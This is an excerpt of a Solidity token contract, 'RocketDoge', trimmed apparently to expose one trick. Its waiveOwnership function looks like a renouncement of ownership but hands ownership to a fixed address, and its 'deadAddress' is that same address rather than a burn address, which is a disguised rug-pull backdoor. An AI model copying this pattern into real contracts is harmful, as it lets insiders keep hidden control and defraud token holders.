...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xF2c6f6aa0AC554147800B1c8dcC1bA7aF4b43Fbe));
        _owner = address(0xF2c6f6aa0AC554147800B1c8dcC1bA7aF4b43Fbe);
    }
...
contract RocketDoge is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x47E880ba29F6d1884B847dd64aB65074BFF3d007);
    address payable public teamWalletAddress = payable(0x36Bb61426D08dFB7112216Da6CCc827958a68F22);
    address public immutable deadAddress = 0xF2c6f6aa0AC554147800B1c8dcC1bA7aF4b43Fbe;
